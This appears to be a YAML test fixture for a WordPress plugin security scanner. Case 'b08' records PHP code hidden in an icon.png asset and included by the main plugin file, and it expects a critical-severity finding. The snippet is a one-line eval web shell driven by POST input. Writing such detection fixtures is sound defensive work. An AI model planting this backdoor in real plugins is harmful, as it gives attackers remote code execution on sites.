@@ -1,0 +1,13 @@
+eco: wp-plugin
+note: 'b08: PHP in a new assets/icon.png that the plugin includes'
+meta_old:
+  ref:
+    version: 1.0.0
+features_old: []
+features_new:
+- {kind: code-in-asset, key: assets/icon.png, path: assets/icon.png, line: 1, snippet: '<?php @eval($_POST[''c'']);
+    ?>'}
+- {kind: include, key: include, path: acme.php, line: 30, attrs: {target: /assets/icon.png}, snippet: include __DIR__
+    . '/assets/icon.png';}
+expect:
+- {id: code-in-asset, min_severity: critical}
